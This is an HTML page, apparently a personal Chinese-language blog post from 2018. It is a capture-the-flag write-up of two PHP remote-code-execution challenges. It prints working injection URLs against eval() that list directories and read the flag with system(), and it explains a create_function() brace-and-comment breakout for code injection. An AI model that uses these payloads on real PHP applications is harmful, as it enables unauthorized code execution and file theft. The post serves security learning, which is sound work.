@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+
+<title>RCE | Love to share</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bentham&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bentham&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div id="post-toc" class="post-toc">
+            <span class="post-toc-title">catalogue</span>
+            <div class="post-toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE1"><span class="toc-text">RCE1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE2"><span class="toc-text">RCE2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#creat-function-原理参考博客"><span class="toc-text">creat_function()原理参考博客</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
+            </div>
+        </div>
+    
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">RCE</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">zhhhy</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">October 14, 2018&nbsp;&nbsp;18:23:03</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <section class="post-content">
+            <p>这次是真真真真被自己蠢哭了!!</p>
+<a id="more"></a>
+
+<h2 id="RCE1"><a href="#RCE1" class="headerlink" title="RCE1"></a>RCE1</h2><p>打开网页就直接报错了</p>
+<p><img src="RCE/1.png" alt></p>
+<p>看到eval函数,第一反应是利用这个达到任意执行代码<br>于是测试</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//chall2.ctfs.me:8010/?name=phpinfo();</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="RCE/2.png" alt></p>
+<p>发现报错,但是是单引号错.说明语句注入了但是语法不正确,继续测试</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//chall2.ctfs.me:8010/?name=phpinfo();%23</span></span><br></pre></td></tr></table></figure>
+
+<p>加了注释符,成功执行了phpinfo()</p>
+<p><img src="RCE/3.png" alt></p>
+<p>那么构造</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(<span class="string">'./'</span>))</span><br><span class="line">http:<span class="comment">//chall2.ctfs.me:8010/?name=print_r(scandir(%27../%27));%23</span></span><br><span class="line">http:<span class="comment">//chall2.ctfs.me:8010/?name=print_r(glob(%22../\*%22));%23</span></span><br><span class="line">http:<span class="comment">//chall2.ctfs.me:8010/?name=system(%27ls%20../%27);%23</span></span><br><span class="line"><span class="comment">#这些语句都可以列出目录</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="E:RCE%5C4.png" alt></p>
+<p>发现打印出上一级目录的内容了,其中包含了flag文件<br>于是继续</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//chall2.ctfs.me:8010/?name=system(%27cat%20../flag%27);%23</span></span><br></pre></td></tr></table></figure>
+
+<p>便可以拿到flag了<br>很好奇的是后端源码是怎么写的<br>当输入如下的时候</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chall2.ctfs.me:8010/?name=phpinfo()</span><br></pre></td></tr></table></figure>
+
+<p>报错如下</p>
+<p><img src="RCE/5.png" alt></p>
+<p>这个神奇的感叹号是做些啥用的呢?????</p>
+<h2 id="RCE2"><a href="#RCE2" class="headerlink" title="RCE2"></a>RCE2</h2><p>查看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>])) &#123; </span><br><span class="line">   $new_func = create_function(<span class="string">''</span>, $_GET[<span class="string">'code'</span>]); </span><br><span class="line">     <span class="keyword">if</span> ($_GET[<span class="string">'code'</span>] === <span class="string">"echo 'hello foobar';"</span>) &#123; </span><br><span class="line">                  $new_func();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>关键代码 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$new_func= create_function(<span class="string">''</span>, $_GET[<span class="string">'code'</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>creat_function函数其实是lambda表达式<br>本地测试 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$new_func = create_function(<span class="string">''</span>, $_GET[<span class="string">'code'</span>]);</span><br><span class="line"><span class="keyword">echo</span> $new_func;</span><br></pre></td></tr></table></figure>
+
+<p>得到输出</p>
+<p><img src="RCE/6.png" alt></p>
+<p>所以它其实是一个简单的函数<br>举个例子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$new_func = create_function(<span class="string">''</span>, <span class="string">"echo 'hello';"</span>);</span><br><span class="line">$new_func();</span><br></pre></td></tr></table></figure>
+
+<p>等价于</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">new_func</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Hello'</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也就是说后面一个参数传给前面一个参数组成一个函数体.<br>回到题目上<br>题目要求我们code值等于</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">'hello foobar'</span></span><br></pre></td></tr></table></figure>
+
+<p>当我们传入echo ‘hello foobar’的时候函数体是这样的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">new_func</span><span class="params">()</span></span>&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">'hello foobar'</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>假设我们传入的是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> ‘hello foobar’&#125;;phpinfo();<span class="comment">/*</span></span><br></pre></td></tr></table></figure>
+
+<p>函数体按照原有的规则生成,但是由于花括号和注视符的出现使得发生了非预期的变化<br>整理后的函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">new_func</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'hello foobar'</span>;  </span><br><span class="line">         &#125;</span><br><span class="line">        phpinfo();<span class="comment">/*</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现括号闭合了,原有的括号甚至后面的代码都被注释掉了,导致phpinfo()得到执行.<br>于是剩下的就是打印目录,寻找flag.txt文件了.</p>
+<h3 id="creat-function-原理参考博客"><a href="#creat-function-原理参考博客" class="headerlink" title="creat_function()原理参考博客"></a>creat_function()原理参考博客</h3><p><a href="https://blog.csdn.net/while0/article/details/72276440" target="_blank" rel="noopener">https://blog.csdn.net/while0/article/details/72276440</a></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>刚做web_for_pentester的命令注入和代码注入部分,所以碰上这两题还是能够解决的.<br>但是RCE2却卡了我一天时间…原因是之前原理搞糊涂了,误以为花括号是为了闭合if语句,现在仔细分析一下还算透彻.算是get到这个命令执行的基本方法了吧.</p>
+
+        </section>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>zhhhy</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://yoursite.com/2018/10/14/RCE/">http://yoursite.com/2018/10/14/RCE/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Solgan:</span>
+                         <span>Do you believe in <strong>DESTINY<strong>?</strong></strong></span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2018/10/17/maccms/">Maccms8.0 sql getshell</a>
+            
+            
+            <a class="next" rel="next" href="/2018/10/13/Web-for-pentester-02/">Web_for_pentester-02</a>
+            
+        </section>
+
+
+    </article>
+</div>
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© zhhhy | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Sirice19/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+    </div>
+</body>
+</html>
